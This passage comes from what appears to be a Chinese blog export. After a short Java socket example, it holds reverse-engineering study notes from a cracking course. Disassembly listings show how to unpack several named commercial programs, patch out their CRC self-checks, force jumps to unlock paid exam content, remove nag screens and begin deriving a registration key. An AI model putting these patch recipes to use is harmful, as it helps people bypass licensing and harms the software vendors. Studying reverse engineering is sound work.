         s.close();\n        }\n    }\n}\n```\n\n```java\nimport java.net.*;\nimport java.io.*;\npublic class TCPClient\n{\n    public static void main(String[] args) throws Exception\n    {\n        Socket s = new Socket(\"127.0.0.1\", 6666);\n        OutputStream os = s.getOutputStream();\n        DataOutputStream dos = new DataOutputStream(os);\n        dos.writeUTF(\"v5le0n9\");\n        dos.flush();\n        dos.close();\n        s.close();\n    }\n}\n```\n\n","categories":["开发"],"tags":["Java"]},{"title":"吾爱破解学习指导教程","url":"/posts/f398dcca.html","content":"\nNO.1~NO.3在[第一课——脱壳基础](https://v5le0n9.github.io/posts/e2d652c5.html)就已经实践完了，所以这个笔记从NO.4开始。这个笔记是在[调试器使用教程](https://v5le0n9.github.io/posts/33a085c7.html)的基础上讲解，所以一定要保证自己已经了解OD的基本操作才推荐看这个笔记，但绝对会比论坛的大牛们讲解的详细。\n\n<!--more-->\n\n# NO.4 破解实战\n\n由于我是用户大牛在讲解的帖子上没有附上实验程序的下载链接，所以只能挑附上下载链接的进行详细记录，没有附上下载链接的只能讲解流程，详细请看我是用户的帖子。\n\n## 第一战：超级U盘锁\n\nhttps://www.52pojie.cn/thread-197281-1-1.html\n\nASPack壳+两处自校验+跳转爆破/赋值爆破\n\n## 第二战：豪杰屏幕录像机 v2.0\n\nhttp://www.52pojie.cn/thread-197598-1-1.html\n\n修改DLL\n\n## 第三战：LukoolRecorder2.7.5cn\n\nhttps://www.52pojie.cn/thread-197957-1-1.html\n\n明码比较+跳转爆破/赋值爆破\n\n## 第四战：PilotEdit5.9\n\nhttps://www.52pojie.cn/thread-198203-1-1.html\n\n跳转爆破\n\n## 第五战：文件夹加密精灵V5.3\n\nhttps://www.52pojie.cn/thread-198365-1-1.html\n\n重启验证+跳转爆破+算法分析(MD5+程序加密算法)\n\n## 第六战：(帖子被删除了)\n\n## 第七战：XX注册税务师考试锦囊(完)\n\nhttps://www.52pojie.cn/thread-199459-1-1.html\n\nMPRESS壳+CRC相互校验+浮点错误+爆破+去除NAG\n\n先运行一下程序，单独打开`ESIExamPlatform.exe`(主程序)是运行不了的，需要打开`ESPlatform.exe`再让它自行启动`ESIExamPlatform.exe`。查壳，两个都有MPRESS壳。\n\n先解决两个程序的脱壳问题。这是个压缩壳，用ESP定律秒脱。脱完名字要改为原程序的名字。脱完壳后两个程序都显示CRC校验失败。\n\n{% asset_img 4.7.2.png CRC校验失败 %}\n\n载入`ESIExamPlatform.exe`搜索字符串把它跳过。\n\n```asm\n00419DA1   . /7C 1C         jl short ESIExamP.00419DBF;nop掉\n00419DA3   . |68 206D4A00   push ESIExamP.004A6D20                   ;  495\n00419DA8   . |50            push eax\n00419DA9   . |E8 B4A40500   call ESIExamP.00474262\n00419DAE   . |83C4 08       add esp,0x8\n00419DB1   . |85C0          test eax,eax\n00419DB3   . |74 0A         je short ESIExamP.00419DBF;nop掉\n00419DB5   . |2B4424 14     sub eax,dword ptr ss:[esp+0x14]\n00419DB9   . |D1F8          sar eax,1\n00419DBB   . |3BC6          cmp eax,esi\n00419DBD   . |75 62         jnz short ESIExamP.00419E21;改为jmp\n00419DBF   > \\6A 00         push 0x0\n00419DC1   .  6A 00         push 0x0\n00419DC3   .  68 286D4A00   push ESIExamP.004A6D28                   ;   《考试锦囊》CRC校验失败，请杀毒后重新下载本系统！\n00419DC8   .  E8 02FB0300   call ESIExamP.004598CF\n```\n\n载入`ESPlatform.exe`搜索字符串把它跳过。\n\n```asm\n004015DF     /74 22         je short ESPlatfo.00401603;nop掉\n004015E1     |8B4424 20     mov eax,dword ptr ss:[esp+0x20]          ;  kernel32.7C839AD8\n004015E5     |8378 F4 00    cmp dword ptr ds:[eax-0xC],0x0\n004015E9     |7C 18         jl short ESPlatfo.00401603;nop掉\n004015EB     |51            push ecx\n004015EC     |50            push eax\n004015ED     |E8 727F0200   call ESPlatfo.00429564\n004015F2     |83C4 08       add esp,0x8\n004015F5     |85C0          test eax,eax\n004015F7     |74 0A         je short ESPlatfo.00401603;nop掉\n004015F9     |2B4424 20     sub eax,dword ptr ss:[esp+0x20]          ;  kernel32.7C839AD8\n004015FD     |D1F8          sar eax,1\n004015FF     |3BC6          cmp eax,esi\n00401601     |75 3E         jnz short ESPlatfo.00401641;改为jmp\n00401603     \\6A 00         push 0x0\n00401605      6A 00         push 0x0\n00401607      68 00934400   push ESPlatfo.00449300                   ;   《考试锦囊》CRC校验失败，请杀毒后重新下载本系统！\n0040160C  |.  E8 2FCD0000   call ESPlatfo.0040E340\n```\n\n此时单独运行`ESIExamPlatform.exe`会出现异常。\n\n{% asset_img 4.7.1.png 应用程序发生异常 %}\n\n再次载入OD，找到`4757CA`，在`4757C5`下断，进入函数。\n\n```asm\n004757C5  |.  E8 D8F4FFFF   call ESIExamP.00474CA2\n004757CA  |.  83C4 14       add esp,0x14\n```\n\n```asm\n00474C56  |.  FF15 44B34900 call dword ptr ds:[<&kernel32.#IsSystemResum>; [IsDebuggerPresent\n00474C5C  |.  6A 00         push 0x0                                     ; /pTopLevelFilter = NULL\n00474C5E  |.  8BD8          mov ebx,eax                                  ; |\n00474C60  |.  FF15 48B14900 call dword ptr ds:[<&kernel32.#SetVolumeMoun>; \\SetUnhandledExceptionFilter\n00474C66  |.  8D85 28FDFFFF lea eax,[local.182]\n00474C6C  |.  50            push eax                                     ; /pExceptionInfo = 00124C88\n00474C6D  |.  FF15 44B14900 call dword ptr ds:[<&kernel32.#UnregisterWai>; \\UnhandledExceptionFilter\n```\n\n程序运行到`UnhandledExceptionFilter`处出错。因为这个函数前面没有跳转指令，所以要返回到父函数寻找跳转指令绕过这个子函数。\n\n```asm\n004757AD  |. /74 07         je short ESIExamP.004757B6;绕过循环跳转就必须jmp,但同时异常也会被执行\n004757AF  |. |8B5D 0C       mov ebx,[arg.2]\n004757B2  |. |3BDF          cmp ebx,edi\n004757B4  |. |77 1E         ja short ESIExamP.004757D4;这个跳转实现虽然绕过异常，但一直在循环，直到不循环时也是要执行异常\n004757B6  |> \\E8 BB2D0000   call ESIExamP.00478576\n004757BB  |.  6A 16         push 0x16\n004757BD  |.  5E            pop esi                                      ;  ESIExamP.0047BEE6\n004757BE  |.  8930          mov dword ptr ds:[eax],esi\n004757C0  |>  57            push edi;这个跳过来的是个jmp指令，没办法不执行，改nop也不行\n004757C1  |.  57            push edi\n004757C2  |.  57            push edi\n004757C3  |.  57            push edi\n004757C4  |.  57            push edi\n004757C5  |.  E8 D8F4FFFF   call ESIExamP.00474CA2;异常函数\n```\n\n所以这两个跳转无论如何都不能够使这个异常不实现，继续找父函数。在堆栈窗口找到返回地址跟随。\n\n```asm\n00124F84  |0041B9E7  返回到 ESIExamP.0041B9E7 来自 ESIExamP.0047579E\n```\n\n发现可以利用`0041B9D4`的跳转指令绕过异常函数。\n\n```asm\n0041B9D4  |. /74 14         je short ESIExamP.0041B9EA;改为jmp\n0041B9D6  |. |68 84744A00   push ESIExamP.004A7484                       ;  s\n0041B9DB  |. |6A 01         push 0x1\n0041B9DD  |. |68 FFFFFF00   push 0xFFFFFF\n0041B9E2  |. |E8 B79D0500   call ESIExamP.0047579E;异常函数\n0041B9E7  |. |83C4 0C       add esp,0xC\n0041B9EA  |> \\8D8C24 900000>lea ecx,dword ptr ss:[esp+0x90]\n```\n\n发现单独运行它又弹出一连串的“CRC校验失败，请重新下载本软件”的对话框。搜索字符串，在函数开头下断运行，发现`0043DB14`能绕过弹窗，`0043DB94`不能，因为je指令会绕过jnz指令。所以要在`0043DB14`改为jmp。\n\n```asm\n0043DB14  |. /0F84 C0000000 je ESIExamP.0043DBDA;改为jmp\n...\n0043DB89  |. /74 0B         je short ESIExamP.0043DB96\n0043DB8B  |. |2B4424 14     sub eax,dword ptr ss:[esp+0x14]\n0043DB8F  |. |D1F8          sar eax,1\n0043DB91  |. |83F8 FF       cmp eax,-0x1\n0043DB94  |. |75 1A         jnz short ESIExamP.0043DBB0\n0043DB96  |> \\6A 00         push 0x0\n0043DB98  |.  6A 00         push 0x0\n0043DB9A  |.  68 F4EF4A00   push ESIExamP.004AEFF4                   ;  程序CRC校验失败，请重新下载本软件!\n0043DB9F  |.  E8 2BBD0100   call ESIExamP.004598CF\n```\n\n但这样改就会跳转到“程序不完整”。\n\n```asm\n0043DBDA  |> \\8B4E 20       mov ecx,dword ptr ds:[esi+0x20]\n0043DBDD  |.  6A 65         push 0x65                                ; /TimerID = 65 (101.)\n0043DBDF  |.  51            push ecx                                 ; |hWnd = 494F6396\n0043DBE0  |.  FF15 D8B54900 call dword ptr ds:[<&user32.#435>]       ; \\KillTimer\n0043DBE6  |.  6A 00         push 0x0\n0043DBE8  |.  6A 00         push 0x0\n0043DBEA  |.  68 1CF04A00   push ESIExamP.004AF01C                   ;  程序不完整，请重新下载!\n0043DBEF  |.  E8 DBBC0100   call ESIExamP.004598CF\n```\n\n重新修改：\n\n```asm\n0043DB77  |. /7C 1D         jl short ESIExamP.0043DB96;nop掉\n0043DB79  |. |68 206D4A00   push ESIExamP.004A6D20                   ;  495\n0043DB7E  |. |50            push eax\n0043DB7F  |. |E8 DE660300   call ESIExamP.00474262\n0043DB84  |. |83C4 08       add esp,0x8\n0043DB87  |. |85C0          test eax,eax\n0043DB89  |. |74 0B         je short ESIExamP.0043DB96;nop掉\n0043DB8B  |. |2B4424 14     sub eax,dword ptr ss:[esp+0x14]\n0043DB8F  |. |D1F8          sar eax,1\n0043DB91  |. |83F8 FF       cmp eax,-0x1\n0043DB94  |. |75 1A         jnz short ESIExamP.0043DBB0;修改为jmp\n0043DB96  |> \\6A 00         push 0x0\n0043DB98  |.  6A 00         push 0x0\n0043DB9A  |.  68 F4EF4A00   push ESIExamP.004AEFF4                   ;  程序CRC校验失败，请重新下载本软件!\n0043DB9F  |.  E8 2BBD0100   call ESIExamP.004598CF\n0043DBA4  |.  8B16          mov edx,dword ptr ds:[esi]               ;  ESIExamP.004AF6BC\n0043DBA6  |.  8B82 5C010000 mov eax,dword ptr ds:[edx+0x15C]\n0043DBAC  |.  8BCE          mov ecx,esi\n0043DBAE  |.  FFD0          call eax\n0043DBB0  |>  C68424 880000>mov byte ptr ss:[esp+0x88],0x2\n0043DBB8  |.  8B4424 14     mov eax,dword ptr ss:[esp+0x14]\n0043DBBC  |.  83C0 F0       add eax,-0x10\n0043DBBF  |.  8D48 0C       lea ecx,dword ptr ds:[eax+0xC]\n0043DBC2  |.  83CA FF       or edx,-0x1\n0043DBC5  |.  f0:0fc111     lock xadd dword ptr ds:[ecx],edx\n0043DBC9  |.  4A            dec edx\n0043DBCA  |.  85D2          test edx,edx\n0043DBCC  |.  7F 3D         jg short ESIExamP.0043DC0B;修不修改终将会绕过“程序不完整”弹窗\n0043DBCE  |.  8B08          mov ecx,dword ptr ds:[eax]               ;  ESIExamP.004C8790\n0043DBD0  |.  8B11          mov edx,dword ptr ds:[ecx]\n0043DBD2  |.  50            push eax\n0043DBD3  |.  8B42 04       mov eax,dword ptr ds:[edx+0x4]\n0043DBD6  |.  FFD0          call eax\n0043DBD8  |.  EB 31         jmp short ESIExamP.0043DC0B\n0043DBDA  |>  8B4E 20       mov ecx,dword ptr ds:[esi+0x20]\n0043DBDD  |.  6A 65         push 0x65                                ; /TimerID = 65 (101.)\n0043DBDF  |.  51            push ecx                                 ; |hWnd = 00B1AF3C\n0043DBE0  |.  FF15 D8B54900 call dword ptr ds:[<&user32.#435>]       ; \\KillTimer\n0043DBE6  |.  6A 00         push 0x0\n0043DBE8  |.  6A 00         push 0x0\n0043DBEA  |.  68 1CF04A00   push ESIExamP.004AF01C                   ;  程序不完整，请重新下载!\n0043DBEF  |.  E8 DBBC0100   call ESIExamP.004598CF\n```\n\n运行`ESPlatform.exe`可以正常启动`ESIExamPlatform.exe`出现主程序，单独启动`ESIExamPlatform.exe`也可出现主程序。至此，CRC校验全被清除。\n\n在主程序点击一下功能看程序是否能正常工作。发现在点击“答题记录”或“统计曲线”或“习题集”时出现错误提示框，然后直接退出程序。\n\n{% asset_img 4.7.3.png 浮点数错误 %}\n\n这是因为代码调用了浮点数，而程序在启动时因为缺省没有调用初始化浮点数的函数。程序启动阶段`___tmainCRTStartup`函数中调用了`__cinit`函数，在这个函数的第一个判断是校验浮点运算初始化函数指针所处的section是否为可写，如果可写的话就跳过浮点运算初始化函数，因此缺省情况下会直接显示出错信息并退出，如果该区段不可写，代码会调用浮点运算初始化函数，缺省的指向出错函数的指针会被替换成正常处理函数，因此可以正常运算。\n\n又因为它会退出程序，Ctrl+G搜索`ExitProcess`下断，按下“统计曲线”->确定，程序停在断点处。在堆栈窗口返回到父函数。不断堆栈回溯再跟进来到这，看到下面有个`WriteFile`函数，说明`.MPRESS1`区段可写。\n\n```asm\n0047BC3C  |> \\68 10200100   push 0x12010\n0047BC41  |.  68 60174A00   push ESIExamP.004A1760                                   ;  Microsoft Visual C++ Runtime Library\n0047BC46  |.  57            push edi\n0047BC47  |.  E8 A4EF0000   call ESIExamP.0048ABF0                                   ;  错误函数\n0047BC4C  |.  83C4 0C       add esp,0xC\n0047BC4F  |.  EB 32         jmp short ESIExamP.0047BC83\n0047BC51  |>  6A F4         push -0xC                                                ; /DevType = STD_ERROR_HANDLE\n0047BC53  |.  FF15 80B14900 call dword ptr ds:[<&kernel32.#GetStringTypeExA_433>]    ; \\GetStdHandle\n0047BC59  |.  8BD8          mov ebx,eax\n0047BC5B  |.  3BDE          cmp ebx,esi\n0047BC5D  |.  74 24         je short ESIExamP.0047BC83\n0047BC5F  |.  83FB FF       cmp ebx,-0x1\n0047BC62  |.  74 1F         je short ESIExamP.0047BC83\n0047BC64  |.  6A 00         push 0x0\n0047BC66  |.  8D45 F8       lea eax,[local.2]\n0047BC69  |.  50            push eax\n0047BC6A  |.  8D34FD 246B4C>lea esi,dword ptr ds:[edi*8+0x4C6B24]                    ;  R6002\\r\\n- floating point support not loaded\\r\\n\n0047BC71  |.  FF36          push dword ptr ds:[esi]\n0047BC73  |.  E8 982A0000   call ESIExamP.0047E710\n0047BC78  |.  59            pop ecx                                                  ; |ESIExamP.004754A8\n0047BC79  |.  50            push eax                                                 ; |nBytesToWrite = 0x0\n0047BC7A  |.  FF36          push dword ptr ds:[esi]                                  ; |Buffer = NULL\n0047BC7C  |.  53            push ebx                                                 ; |hFile = 00124EFC\n0047BC7D  |.  FF15 4CB34900 call dword ptr ds:[<&kernel32.#WritePrivateProfileString>; \\WriteFile\n0047BC83  |>  5F            pop edi                                                  ;  ESIExamP.004754A8\n0047BC84  |.  5E            pop esi                                                  ;  ESIExamP.004754A8\n0047BC85  |.  5B            pop ebx                                                  ;  ESIExamP.004754A8\n0047BC86  |.  C9            leave\n0047BC87  \\.  C3            retn\n```\n\n将`.MPRESS1`区段改为不可写显然不现实，因为程序不止这一处是写入的，那就只能强制初始化。载入IDA查看`__cinit`函数，发现它有` __IsNonwritableInCurrentImage`函数，用来判断地址是否可写，不能写则调用`__fpmath`(call off_4A11A8)进行初始化。 \n\n{% asset_img 4.7.4.png 浮点数错误 %}\n\n回到OD修改`475561`和`475570`地址的`jz`指令改为`nop`。\n\n```asm\n00475561     /74 19         je short ESIExamP.0047557C;nop掉\n00475570     /74 0A         je short ESIExamP.0047557C;nop掉\n```\n\n习题集、统计曲线等等都可以正常打开了。\n\n接着爆破。最终目的是能bp试卷，所以找到两处购买试题的地方，可知标志位保存在`ebx+0x15C`中。\n\n```asm\n0043032E   > \\83BB 5C010000>cmp dword ptr ds:[ebx+0x15C],0x0\n00430335   .  0F85 A5000000 jnz ESIExamP.004303E0\n0043033B   .  8D8B CC050000 lea ecx,dword ptr ds:[ebx+0x5CC]\n00430341   .  51            push ecx\n00430342   .  8D95 B0F8FFFF lea edx,dword ptr ss:[ebp-0x750]\n00430348   .  68 78CB4A00   push ESIExamP.004ACB78                   ;  &nbsp;&nbsp;&nbsp;<a href=\n0043034D   .  52            push edx                                 ;  ntdll.KiFastSystemCallRet\n0043034E   .  E8 3D56FDFF   call ESIExamP.00405990\n00430353   .  83C4 0C       add esp,0xC\n00430356   .  68 28CB4A00   push ESIExamP.004ACB28                   ;  ><font color=red>未购买该试题 点击购买</font></a>\n```\n\n```asm\n00430B14   .  83BB 5C010000>cmp dword ptr ds:[ebx+0x15C],0x0\n00430B1B   .  0F85 9C000000 jnz ESIExamP.00430BBD\n00430B21   .  8D8B CC050000 lea ecx,dword ptr ds:[ebx+0x5CC]\n00430B27   .  51            push ecx\n00430B28   .  8D95 90F8FFFF lea edx,dword ptr ss:[ebp-0x770]\n00430B2E   .  68 C4CC4A00   push ESIExamP.004ACCC4                   ;  <a href=\n00430B33   .  52            push edx                                 ;  ntdll.KiFastSystemCallRet\n00430B34   .  E8 574EFDFF   call ESIExamP.00405990\n00430B39   .  83C4 0C       add esp,0xC\n00430B3C   .  68 28CB4A00   push ESIExamP.004ACB28                   ;  ><font color=red>未购买该试题 点击购买</font></a>\n```\n\n修改方法有两种：\n\n1. 查找参考->地址常量，找到所有`cmp dword ptr ds:[ecx+0x15C],0x0 `，修改其下面的跳转指令；\n2. 查找参考->地址常量，找到所有给[ebx+0x15C]赋值的地方，修改其赋值。\n\n选择哪一个比较好视工作量而定，肯定是哪个修改量少修改哪个。\n\n我觉得在这程序里第一种方法工作量比较小。修改完后已经没有“购买试题”的字样了，但NAG窗口还在。搜索字符串先将这里修改了，试题我都bp了，怎么能说我没注册呢！\n\n```asm\n0043E6A2     /74 66         je short ESIExamP.0043E70A               ;  nop掉\n0043E6A4   . |68 8CF04A00   push ESIExamP.004AF08C                   ;  您已获得本套系统正版授权，谢谢您的支持！\n0043E6A9   . |68 24040000   push 0x424\n0043E6AE   . |8BCD          mov ecx,ebp\n0043E6B0   . |E8 A2270100   call ESIExamP.00450E57\n0043E6B5   . |8BC8          mov ecx,eax\n0043E6B7   . |E8 DB280100   call ESIExamP.00450F97\n0043E6BC   . |68 B8F04A00   push ESIExamP.004AF0B8                   ;  系统已经注册\n0043E6C1   . |6A 01         push 0x1\n```\n\n接着去掉NAG窗口。在命令窗口下断`bp CreateDialogIndirectParamW`(CreateDialogIndirectParam是用于从内存中的对话框模板上创建一个无模式对话框的函数)。第一次F9运行至断点处，第二次F9出现主程序，第三次F9出现NAG。所以要在第二次F9到第三次F9之间找到绕过NAG窗口的指令。\n\n在第二次F9后，一路F8，运行到这一句时弹出NAG窗口。(这里前面有个可以绕过`call`指令的跳转指令，但是不能将它改为`jmp`，因为你会发现这个`call`指令被运行了两次，第一次是主程序，第二次才是NAG)\n\n```asm\n00452936     /74 1E         je short ESIExamP.00452956\n00452938   . |6A 04         push 0x4\n0045293A   . |5F            pop edi\n0045293B   . |8BCE          mov ecx,esi\n0045293D   . |E8 C9E5FFFF   call ESIExamP.00450F0B\n00452942   . |A9 00010000   test eax,0x100\n00452947   . |74 03         je short ESIExamP.0045294C\n00452949   . |6A 05         push 0x5\n0045294B   . |5F            pop edi\n0045294C   > |57            push edi\n0045294D   . |8BCE          mov ecx,esi\n0045294F   . |E8 B8270000   call ESIExamP.0045510C                   ;  第一次主程序，第二次NAG窗口\n00452954   . |33FF          xor edi,edi\n00452956   > \\397E 20       cmp dword ptr ds:[esi+0x20],edi     \n```\n\n在堆栈窗口找到这句反汇编窗口跟随。(主程序与NAG“返回到”的地址不同)\n\n```asm\n00124ED0   0043835E  返回到 ESIExamP.0043835E 来自 ESIExamP.00452827\n```\n\n将`jnz`修改为`jmp`指令绕过NAG窗口。\n\n```asm\n00438341   . /75 2A         jnz short ESIExamP.0043836D;jmp\n00438343   . |8D8D E4F9FFFF lea ecx,dword ptr ss:[ebp-0x61C]\n00438349   . |51            push ecx\n0043834A   . |E8 4122FEFF   call ESIExamP.0041A590\n0043834F   . |8D8D E4F9FFFF lea ecx,dword ptr ss:[ebp-0x61C]\n00438355   . |C645 FC 27    mov byte ptr ss:[ebp-0x4],0x27\n00438359   . |E8 C9A40100   call ESIExamP.00452827                                ;  NAG\n0043835E   . |8D95 E4F9FFFF lea edx,dword ptr ss:[ebp-0x61C]\n00438364   . |52            push edx\n00438365   . |885D FC       mov byte ptr ss:[ebp-0x4],bl\n00438368   . |E8 2323FEFF   call ESIExamP.0041A690\n0043836D   > \\8D4D E8       lea ecx,dword ptr ss:[ebp-0x18]\n```\n\n## 第八战：A-PDF Split(已下载)\n\nhttps://www.52pojie.cn/thread-199834-1-1.html\n\nASProtect1.23 RC1+14处自校验+跳转爆破\n\n发现不会手脱，那就用脱壳工具中的ASProtect Unpacker 汉化版脱壳。是用Delphi写的程序。\n\n载入OD，下`bp MessageBoxA`和`bp MessageBoxW`断点，运行，点击试用卡在了kernel32模块的某个地方。F8走出来，回到用户代码处。\n\n```asm\n0040B285      E8 8692FFFF   call PdfSplit.00404510\n0040B28A  |.  5F            pop edi                                            ;  PdfSplit.0040B28A\n0040B28B  |.  5E            pop esi                                            ;  PdfSplit.0040B28A\n```\n\n发现应该是`40B285`地址的call指令产生的错误，直接把它NOP掉。保存，运行发现程序直接退出了。程序退出调用的是`PostQuitMessage`函数，下这个断点。点击“Try”，程序停在断点处。堆栈查看返回函数。\n\n```asm\n0012FD88   0048BDBC  /CALL 到 PostQuitMessage 来自 PdfSplit.0048BDB7\n0012FD8C   00000000  \\ExitCode = 0x0\n0012FD90   00576B5B  返回到 PdfSplit.00576B5B 来自 PdfSplit.0048BDAC\n0012FD94   0012FDEC  指向下一个 SEH 记录的指针\n0012FD98   0057705E  SE处理程序\n```\n\n```asm\n0048BDB3  |. /74 07         je short PdfSplit.0048BDBC;要跳\n0048BDB5  |. |6A 00         push 0x0                                 ; /ExitCode = 0x0\n0048BDB7  |. |E8 18BDF7FF   call <jmp.&user32.PostQuitMessage>       ; \\PostQuitMessage\n0048BDBC  \\> \\C3            retn\n```\n\n`je`修改为`jmp`。保存。运行程序发现点击“Try”能进入主程序了，也没有错误框。但点击“Browse”又弹出错误框。\n\n{% asset_img 8.2.png 弹出错误 %}\n\n点击关闭还关闭不了了。\n\n{% asset_img 8.2.png 无效指针 %}\n\n...好难，脱壳好像引发别的错误了...\n\n## 第九战：XXPDF转WORD助手\n\nhttps://www.52pojie.cn/thread-200655-1-1.html\n\ntElock壳+自校验+爆破\n\n## 第十战：LanHelper算法分析与注册机的编写\n\nhttps://www.52pojie.cn/thread-200798-1-1.html\n\n算法分析\n\n{% asset_img 10.1.png 注册码有误 %}\n\n拿去查壳，没有壳，是Delphi写的程序。载入OD搜索字符串“注册码”没有找到。没关系，谁让它是Delphi写的呢？把它载入Delphi Decompiler，点击“Procedures”(过程)，找到有关注册字样的单元名。注册的窗体有两个文本框和三个按钮，找到最符合的注册窗体。\n\n{% asset_img 10.2.png dede找注册窗体 %}\n\n猜测`Button1Click`是“确定”按钮，因为“取消”就会返回到父窗口，相当于关闭嘛，没有按钮可以理解。为了验证我们的猜想，双击`Button1Click`进去找到第一条汇编指令，地址为`004DCB40`。\n\n{% asset_img 10.3.png 按钮首地址 %}\n\n回到OD，Ctrl + G输入地址，下断运行。输入名称、注册码后点击确定，OD成功停在断点处，说明找对了。\n\nF8往下运行。\n\n```asm\n004DCB6D   .  E8 5616FAFF   call LanHelpe.0047E1C8\n004DCB72   .  8B45 B8       mov eax,dword ptr ss:[ebp-0x48]\n004DCB75   .  8D55 BC       lea edx,dword ptr ss:[ebp-0x44]\n004DCB78   .  E8 47CCF2FF   call LanHelpe.004097C4                   ;  获取用户名\n004DCB7D   .  837D BC 00    cmp dword ptr ss:[ebp-0x44],0x0          ;  判断用户名是否为空\n004DCB81   .  74 22         je short LanHelpe.004DCBA5\n004DCB83   .  8D55 B0       lea edx,dword ptr ss:[ebp-0x50]\n004DCB86   .  8B45 FC       mov eax,dword ptr ss:[ebp-0x4]\n004DCB89   .  8B80 04030000 mov eax,dword ptr ds:[eax+0x304]\n004DCB8F   .  E8 3416FAFF   call LanHelpe.0047E1C8\n004DCB94   .  8B45 B0       mov eax,dword ptr ss:[ebp-0x50]\n004DCB97   .  8D55 B4       lea edx,dword ptr ss:[ebp-0x4C]\n004DCB9A   .  E8 25CCF2FF   call LanHelpe.004097C4                   ;  获取假码\n004DCB9F   .  837D B4 00    cmp dword ptr ss:[ebp-0x4C],0x0          ;  判断假码是否为空\n004DCBA3   .  75 44         jnz short LanHelpe.004DCBE9\n004DCBA5   >  8D4D F0       lea ecx,dword ptr ss:[ebp-0x10]\n```\n\n```asm\n004DCBE9   > \\8D55 A8       lea edx,dword ptr ss:[ebp-0x58]\n004DCBEC   .  8B45 FC       mov eax,dword ptr ss:[ebp-0x4]\n004DCBEF   .  8B80 04030000 mov eax,dword ptr ds:[eax+0x304]\n004DCBF5   .  E8 CE15FAFF   call LanHelpe.0047E1C8\n004DCBFA   .  8B45 A8       mov eax,dword ptr ss:[ebp-0x58]\n004DCBFD   .  50            push eax\n004DCBFE   .  8D55 A4       lea edx,dword ptr ss:[ebp-0x5C]\n004DCC01   .  8B45 FC       mov eax,dword ptr ss:[ebp-0x4]\n004DCC04   .  8B80 00030000 mov eax,dword ptr ds:[eax+0x300]\n004DCC0A   .  E8 B915FAFF   call LanHelpe.0047E1C8\n004DCC0F   .  8B45 A4       mov eax,dword ptr ss:[ebp-0x5C]\n004DCC12   .  5A            pop edx                                  ;  0012F338\n004DCC13   .  E8 9C270000   call LanHelpe.004DF3B4                   ;  用户名和假码放到寄存器，这个是关键call\n004DCC18      84C0          test al,al                               ;  比较al的值\n004DCC1A      0F84 F4030000 je LanHelpe.004DD014                     ;  关键跳\n```\n\n运行到关键跳处修改Z标志位，F9运行，发现成功注册，但程序是重启验证类型的。\n\n{% asset_img 10.4.png 注册成功 %}\n\n那我们将关键跳nop掉作为2.exe，修改al的值作为3.exe试试。\n\n意料之中，2.exe每次都需要注册，根本就行不通。3.exe竟然说注册码有误，我们不是跳过了吗？载入OD发现al确实是变成1，但是je跳转还是实现了。好吧既然这样就进入关键call一探究竟。\n\n输入用户名v5le0n9，假码l30n9ry0n。进入关键call。\n\n{% asset_img 10.5.png 算法分析 %}\n\n{% asset_img 10.6.png 算法分析 %}\n\n{% asset_img 10.7.png 算法分析 %}\n\n将这循环跑了6次之后，可以知道真码前6位固定为LH4A8N。循环结束后，比较dl的值，如果dl为0则跳转到eax清零处。\n\n重新载入，将假码的前6位设置为`LH4A8N`再分析。去到比较dl的值处，现在已经不为0了。继续往下走，看到一些红色指令。\n\nfild和fstp都是x86指令，fild是将整数转化为长双精FP80压栈(压到st0)，\nfstp是将弹栈指令，将st0弹出。ebp始终指向栈顶，ebp是在堆栈中寻址用的。\n\n```asm\n004DF49C   .  84D2             test dl,dl\n004DF49E   .  0F84 F8030000    je LanHelpe.004DF89C\n004DF4A4   .  33C0             xor eax,eax\n004DF4A6   .  8945 E0          mov dword ptr ss:[ebp-0x20],eax\n004DF4A9   .  8945 E4          mov dword ptr ss:[ebp-0x1C],eax\n004DF4AC   .  8B45 F8          mov eax,dword ptr ss:[ebp-0x8]           ;  eax是假码\n004DF4AF   .  8A58 06          mov bl,byte ptr ds:[eax+0x6]             ;  将第7位赋值给bl\n004DF4B2   .  33C0             xor eax,eax                              ;  eax清零\n004DF4B4   .  8AC3             mov al,bl                                ;  bl再赋值给al\n004DF4B6   .  8945 A0          mov dword ptr ss:[ebp-0x60],eax          ;  将假码第7位压入[ebp-0x60]\n004DF4B9   .  DB45 A0          fild dword ptr ss:[ebp-0x60]             ;  将第7位放入st0中\n004DF4BC   .  83C4 F4          add esp,-0xC                             ;  更新栈顶指针\n004DF4BF   .  DB3C24           fstp tbyte ptr ss:[esp]                  ;  pop栈顶数据\n004DF4C2   .  9B               wait\n004DF4C3   .  68 FE3F0000      push 0x3FFE\n004DF4C8   .  68 BD529691      push 0x919652BD\n004DF4CD   .  68 3411363C      push 0x3C361134\n004DF4D2   .  E8 9D1AF5FF      call LanHelpe.00430F74                   ;  将上面3个参数入栈调用F74\n```\n\n后面也有很多调用F74的，所以进去F74分析一下。\n\n{% asset_img 10.8.png 算法分析 %}\n\n{% asset_img 10.9.png 算法分析 %}\n\n...又要进去BF4分析一下，我真看不懂啊救命\n\n# NO.5 .NET系列教程\n\nBlue的实战软件全都过期了，所以我找了别的教程自力更生。\n\n[.Net零基础破解教程](https://v5le0n9.github.io/posts/784f7e1d.html)\n\n# NO.6 去软件弹窗系列教程\n\n## 第一课：弹窗暗桩\n\n运行一下程序，弹出网页。程序无壳，查找一下字符串，定位关键代码处。\n\n```asm\n00401004  /.  55            push ebp\n00401005  |.  8BEC          mov ebp,esp\n00401007  |.  6A 00         push 0x0\n00401009  |.  68 106B4600   push 第一课.00466B10                        ;  恭喜你：暗桩没有触发\n0040100E  |.  6A FF         push -0x1\n00401010  |.  6A 08         push 0x8\n00401012  |.  68 04000116   push 0x16010004\n00401017  |.  68 01000152   push 0x52010001\n0040101C  |.  E8 A0000000   call 第一课.004010C1\n00401021  |.  83C4 18       add esp,0x18\n00401024  |.  E8 04000000   call 第一课.0040102D;暗桩关键call，nop即可\n00401029  |.  8BE5          mov esp,ebp\n0040102B  |.  5D            pop ebp                                  ;  kernel32.7C817077\n0040102C  \\.  C3            retn\n0040102D  /$  55            push ebp\n0040102E  |.  8BEC          mov ebp,esp\n00401030  |.  68 04000080   push 0x80000004\n00401035  |.  6A 00         push 0x0\n00401037  |.  68 256B4600   push 第一课.00466B25                        ;  www.52pojie.cn\n0040103C  |.  68 01000000   push 0x1\n00401041  |.  B8 01000000   mov eax,0x1\n00401046  |.  BB 10584400   mov ebx,第一课.00445810\n0040104B  |.  E8 77000000   call 第一课.004010C7\n00401050  |.  83C4 10       add esp,0x10\n00401053  |.  6A 00         push 0x0\n00401055  |.  68 346B4600   push 第一课.00466B34                        ;  失败了！暗桩已经触发\n```\n\n## 